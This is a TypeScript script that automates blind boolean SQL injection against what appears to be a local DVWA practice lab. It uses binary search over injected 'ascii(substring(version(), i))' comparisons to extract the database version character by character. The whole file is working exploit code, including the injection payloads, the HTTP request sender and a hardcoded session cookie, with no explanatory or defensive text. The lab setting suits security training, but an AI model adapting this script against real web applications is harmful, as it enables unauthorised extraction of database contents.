/**
 * Strategy:
 * - Use a lib to do HTTP requests.
 * - First, find the length of the version using Binary search algorithm.
 * - For each character, guess from ASCII characters using Binary search algorithm.
 */

import axios, { AxiosError, AxiosResponse } from 'axios';
import { generateNumbers } from './generator';
import { log } from './logger';
import { binarySearch } from './searcher';

const FoundMessage = 'User ID exists in the database.';
const NotFoundMessage = 'User ID is MISSING from the database.';

export async function getDatabaseVersion(): Promise<string> {
  const length = await getVersionLength();
  const asciiCodes = generateNumbers(32, 126);
  let version = '';
  let i = 0;
  while (version.length < length) {
    const lt = async (midItem: number) => {
      const res = await sendInjectionHttpRequest(
        `1' and ${midItem} < ascii(substring(version(), ${i + 1})) and '1' = '1`
      );
      return isFoundReponse(res!);
    };

    const gt = async (midItem: number) => {
      const res = await sendInjectionHttpRequest(
        `1' and ${midItem} > ascii(substring(version(), ${i + 1})) and '1' = '1`
      );
      return isFoundReponse(res!);
    };

    const j = await binarySearch(asciiCodes, lt, gt);
    if (j === -1) {
      throw new Error("Didn't found ASCII code.");
    }
    const code = asciiCodes[j];
    version += String.fromCharCode(code);
    log(`Found: ${code} -> ${version}`);
    i++;
  }

  return version;
}

async function getVersionLength(maxLengthToTry: number = 50): Promise<number> {
  const lengthCases = generateNumbers(1, maxLengthToTry);

  const lt = async (midItem: number) => {
    const res = await sendInjectionHttpRequest(
      `1' and ${midItem} < length(version()) and '1' = '1`
    );
    return isFoundReponse(res!);
  };

  const gt = async (midItem: number) => {
    const res = await sendInjectionHttpRequest(
      `1' and ${midItem} > length(version()) and '1' = '1`
    );
    return isFoundReponse(res!);
  };

  const i = await binarySearch(lengthCases, lt, gt);
  if (i === -1) {
    throw new Error("Didn't found version length");
  }
  log(`Version length is: ${lengthCases[i]}`);
  return lengthCases[i];
}

async function sendInjectionHttpRequest(injectionValue: string) {
  log(injectionValue);

  try {
    return await axios.get(
      `http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=${injectionValue}&Submit=Submit`,
      {
        headers: {
          Cookie: 'PHPSESSID=bo3uq18mqc3dkfurpcm43l210u; security=low',
        },
      }
    );
  } catch (error) {
    if (error instanceof AxiosError) {
      return error.response;
    } else {
      throw error;
    }
  }
}

function isFoundReponse(res: AxiosResponse) {
  if ((res.data as string).includes(FoundMessage)) {
    return true;
  }
  if ((res.data as string).includes(NotFoundMessage)) {
    return false;
  }
  throw new Error(
    'The response is invalid (it seems PHPSESSID is not correct).'
  );
}
